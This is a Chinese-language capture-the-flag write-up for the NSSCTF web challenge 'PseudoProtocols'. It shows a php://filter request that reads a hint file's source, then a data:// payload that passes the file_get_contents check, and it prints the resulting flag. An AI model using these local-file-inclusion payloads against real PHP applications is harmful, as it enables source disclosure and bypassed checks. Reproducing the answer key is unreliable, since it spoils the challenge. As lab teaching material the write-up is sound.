---
title: "[SWPUCTF 2021 新生赛] PseudoProtocols"
date: 2026-05-18
category: WEB
tags:
  - PHP
  - 伪协议
  - LFI
  - data协议
NSSCTF: https://www.nssctf.cn/problem/441
---

# [SWPUCTF 2021 新生赛] PseudoProtocols

## 题目信息

- **URL**: `http://node7.anna.nssctf.cn:22250/`
- **类型**: PHP 伪协议链
- **核心考点**: `php://filter` 读取源码 + `data://` 构造数据流

## 解题过程

### Step 1：发现提示链

访问根目录，自动 302 到 `index.php?wllm=`，页面明文提示：

> hint is hear Can you find out the hint.php?

URL 中存在 `wllm` 参数，且题目标签提示 **PHP 伪协议**，直接尝试用 `php://filter` 读取 `hint.php`：

```
/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php
```

返回 Base64：
```
PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=
```

解码后：
```php
<?php
//go to /test2222222222222.php
?>
```

### Step 2：审计 test2222222222222.php

访问 `/test2222222222222.php`，得到源码：

```php
<?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?>
```

关键逻辑：`file_get_contents($a, 'r')` 必须以只读方式读取到内容为 **`I want flag`**。

### Step 3：data:// 伪协议绕过

`data://` 是 PHP 数据流封装器，可以将数据直接内联到 URL 中当作文件内容读取。构造：

```
/test2222222222222.php?a=data://text/plain,I%20want%20flag
```

`file_get_contents()` 读取 `data://` 流时，会将内联数据作为文件内容返回，恰好满足 `=== 'I want flag'` 的严格比较。

回显：
```
success
NSSCTF{85fea3b7-e4e0-4daf-8686-ec5f895841f7}
```

## Flag

```
NSSCTF{85fea3b7-e4e0-4daf-8686-ec5f895841f7}
```

## 总结

- **`php://filter`** 是 LFI 场景下读取 PHP 源码的必备手段，配合 `convert.base64-encode` 可绕过直接执行
- **`data://`** 伪协议能够将任意字符串作为"文件"内容供 `file_get_contents()` 读取，是绕过"文件内容固定值校验"的经典手法
- 两种伪协议的组合链是 CTF Web 入门阶段的典型考点
